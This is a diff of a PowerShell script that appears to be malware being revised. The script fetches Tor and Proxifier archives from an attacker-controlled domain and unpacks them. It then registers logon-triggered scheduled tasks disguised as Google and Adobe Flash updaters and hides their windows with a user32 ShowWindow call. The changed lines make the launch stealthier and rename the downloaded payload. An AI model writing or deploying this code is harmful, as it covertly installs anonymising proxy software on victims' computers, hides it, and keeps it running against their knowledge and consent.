@@ -24,11 +24,6 @@ $LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
 $LogonTrigger.StartBoundary=[System.DateTime]::Now;
 $LogonTrigger.UserId=$env:username;
 $td.Triggers.Add($LogonTrigger);
-$TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
-$TimeTrigger.StartBoundary=[System.DateTime]::Now;
-$TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(30);
-$TimeTrigger.Repetition.StopAtDurationEnd=$False;
-$td.Triggers.Add($TimeTrigger);
 $ExecAction=New-Object Microsoft.Win32.TaskScheduler.ExecAction($cmd,$params);
 $td.Actions.Add($ExecAction);
 $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
@@ -50,15 +45,16 @@ if ((Test-Path $DestTP) -eq 1){rm -Force -Recurse $DestTP;}md $DestTP | Out-Null
 Unzip $TFile $DestTP;
 rm -Force $TFile;
 $tor=$DestTP+'\Tor\tor.exe';
-$tor_cmd="-WindowStyle hidden `"`$t = '[DllImport(\`"user32.dll\`")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member `$t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Start-Process -WindowStyle hidden -Wait -FilePath \`"$tor\`";`"";
+$tor_cmd="-WindowStyle hidden `"`$t = '[DllImport(\`"user32.dll\`")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member `$t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Start-Process -WindowStyle hidden -FilePath \`"$tor\`";`"";
 AddTask 'GoogleUpdateTask' 'PowerShell.exe' $tor_cmd;
-$PFile=$env:Temp+'\p.zip';
+$PFile=$env:Temp+'\p1.zip';
 $wc=new-object net.webclient;
-$purl='http://'+$Domain+'.link/p.zip?t='+[System.DateTime]::Now.Ticks;
+$purl='http://'+$Domain+'.link/p1.zip?t='+[System.DateTime]::Now.Ticks;
 $wc.DownloadFile($purl,$PFile);
 Unzip $PFile $DestTP;
 rm -Force $PFile;
 $p=$DestTP+'\p\Proxifier.exe';
-AddTask 'AdobeFlashPlayerUpdate' $p;
+$p_cmd="-WindowStyle hidden `"`$t = '[DllImport(\`"user32.dll\`")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member `$t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Start-Process -WindowStyle hidden -FilePath \`"$p\`";Start-Sleep -m 500;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetProcessesByName(\`"proxifier\`") | Get-Process).MainWindowHandle, 0);`"";
+AddTask 'AdobeFlashPlayerUpdate' 'PowerShell.exe' $p_cmd;
 }
 InstallTP
